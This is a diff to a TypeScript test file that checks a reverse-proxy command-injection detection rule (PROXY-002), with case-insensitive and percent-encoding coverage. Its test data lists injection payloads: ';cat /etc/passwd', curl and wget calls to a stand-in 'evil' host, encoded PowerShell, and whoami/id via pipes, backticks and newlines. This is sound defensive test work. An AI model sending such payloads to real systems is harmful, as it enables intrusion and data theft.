@@ -20,6 +20,7 @@ import assert from 'node:assert/strict';
 import * as fs from 'fs';
 import * as path from 'path';
 import * as yaml from 'js-yaml';
+import { compileUserRegex } from './userRegex';
 
 const RULES = path.join(__dirname, '../../../../rules');
 
@@ -27,8 +28,9 @@ function ruleRegex(file: string, field: string): RegExp {
   const doc = yaml.load(fs.readFileSync(path.join(RULES, file), 'utf8')) as any;
   const cond = doc.conditions.find((c: any) => c.field === field && c.operator === 'regex');
   assert.ok(cond, `${file} has no regex condition on ${field}`);
-  // Compiled exactly as rulesEngine does — no flags.
-  return new RegExp(String(cond.value));
+  // Compiled exactly as rulesEngine does, honouring the rule's own flags.
+  const { regex } = compileUserRegex(String(cond.value), cond.flags);
+  return regex;
 }
 
 const SQLI = ruleRegex('reverse-proxy/PROXY-001-sql-injection.yaml', 'path');
@@ -96,4 +98,65 @@ test('PROXY-005 keys on user_agent, so its source parser must capture one', () =
     .filter((p) => JSON.stringify(p.field_mappings).includes('user_agent'));
 
   assert.ok(capturing.length > 0, 'no catalog parser captures user_agent at all');
+});
+
+
+// ---------------------------------------------------------------------------
+// PROXY-002 had the same two blind spots as PROXY-001: case-sensitive matching
+// (so CURL/WGET/PowerShell slipped past a lowercase keyword list) and no
+// coverage of percent-encoded separators. It now declares `flags: i` and
+// mirrors the literal branches for %3B / %7C / %24%28.
+// ---------------------------------------------------------------------------
+
+const CMDI = ruleRegex('reverse-proxy/PROXY-002-command-injection.yaml', 'path');
+
+const CMDI_ATTACKS: Array<[string, string]> = [
+  ['lowercase ;cat', '/ping?host=127.0.0.1;cat+/etc/passwd'],
+  ['uppercase ;CAT', '/ping?host=127.0.0.1;CAT+/etc/passwd'],
+  ['mixed-case ;CuRl', '/ping?host=1.1.1.1;CuRl+http://evil'],
+  ['uppercase ;WGET', '/ping?host=1.1.1.1;WGET+http://evil'],
+  ['capitalised PowerShell', '/run?c=1;PowerShell+-enc+ZQBj'],
+  ['encoded semicolon + cat', '/ping?host=127.0.0.1%3Bcat%20/etc/passwd'],
+  ['encoded semicolon + CURL', '/ping?host=127.0.0.1%3BCURL%20http://evil'],
+  ['encoded pipe + id', '/ping?host=127.0.0.1%7Cid'],
+  ['encoded command substitution', '/run?c=%24%28whoami%29'],
+  ['literal pipe + whoami', '/ping?host=1.1.1.1|whoami'],
+  ['backtick substitution', '/run?c=`id`'],
+  ['newline injection', '/run?c=1%0awhoami'],
+];
+
+// "cat", "bash" and friends appear in ordinary URLs — they must only alert when
+// preceded by a shell metacharacter, encoded or not.
+const CMDI_BENIGN = [
+  '/index.html',
+  '/api/v1/health',
+  '/docs/bash-scripting-guide',
+  '/catalog/items',
+  '/categories/shoes',
+  '/blog/how-to-curl-an-api',
+  '/search?q=hello%20world',
+  '/products?category=shoes&size=10',
+  '/report?year=2026&month=07',
+  '/static/js/app.min.js',
+];
+
+for (const [label, url] of CMDI_ATTACKS) {
+  test(`PROXY-002 detects command injection: ${label}`, () => {
+    assert.ok(CMDI.test(url), `pattern did not match ${url}`);
+  });
+}
+
+test('PROXY-002 does not fire on ordinary traffic', () => {
+  const firing = CMDI_BENIGN.filter((u) => CMDI.test(u));
+  assert.deepEqual(firing, [], `false positives on: ${firing.join(', ')}`);
+});
+
+test('PROXY-002 declares the flags it depends on', () => {
+  // The keyword lists are lowercase; without flags: i the rule silently reverts
+  // to catching only lowercase payloads.
+  const doc = yaml.load(
+    fs.readFileSync(path.join(RULES, 'reverse-proxy/PROXY-002-command-injection.yaml'), 'utf8')
+  ) as any;
+  const cond = doc.conditions.find((c: any) => c.operator === 'regex');
+  assert.equal(cond.flags, 'i');
 });
